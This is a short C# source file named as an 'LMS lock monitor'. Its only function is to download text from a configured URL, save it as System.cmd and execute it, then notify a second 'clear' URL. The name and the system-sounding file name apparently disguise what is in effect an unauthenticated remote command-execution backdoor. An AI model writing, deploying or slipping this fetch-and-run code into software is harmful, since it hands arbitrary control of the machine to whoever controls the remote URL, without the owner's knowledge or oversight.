using System;
using System.Collections.Generic;
using System.Text;
using System.Configuration;
using System.Diagnostics;
using System.Net;
using System.IO;

namespace LMSLockMonitor
{
    public class Program
    {
        static void Main(string[] args)
        {
            Run();
        }
        static void Run()
        {
            string url_getcmd = ConfigurationManager.AppSettings.Get("url_getcmd");
            string url_clear = ConfigurationManager.AppSettings.Get("url_clear");
            string cmd_file = AppDomain.CurrentDomain.BaseDirectory + "/System.cmd";
            WebClient wc = new WebClient();
            wc.Encoding = Encoding.UTF8;
            string cmdText = wc.DownloadString(url_getcmd);
            if (!string.IsNullOrEmpty(cmdText))
            {
                StreamWriter sw = new StreamWriter(cmd_file, false);
                sw.Write(cmdText);
                sw.Close();
               
                Process p = new Process();
                p.StartInfo.FileName = cmd_file;
                p.Start();
                p.Close();
                string temp = wc.DownloadString(url_clear);
            }

        }
    }
}
